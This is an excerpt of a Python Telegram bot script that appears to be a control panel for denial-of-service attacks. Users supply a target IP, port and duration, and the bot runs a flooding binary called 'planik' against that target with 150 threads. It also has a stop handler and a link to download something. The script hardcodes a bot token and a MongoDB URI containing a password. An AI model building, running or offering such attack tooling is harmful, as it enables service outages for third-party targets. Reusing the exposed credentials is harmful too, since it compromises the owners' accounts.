...
TOKEN = '7674498879:AAGk0EBZ2UUZGXwqhF8o_D6dwGOm_K2N858' #Enter_Bot_Token_within_the_colons'
MONGO_URI = 'mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb'
FORWARD_CHANNEL_ID = -1002403029388        # enter the log channel id 
CHANNEL_ID = -1002403029388        # enter the same id as entered above
error_channel_id = -1002403029388       # enter the same id 
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./planik {target_ip} {target_port} {duration} 150"
    try:
...
def handle_stop(message):
    subprocess.run("pkill -f planik", shell=True)
    time.sleep(2)
...
def handle_message(message):
    ...
    if message.text == "Stop Attack 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/manavgamingyt/209*", parse_mode='Markdown')
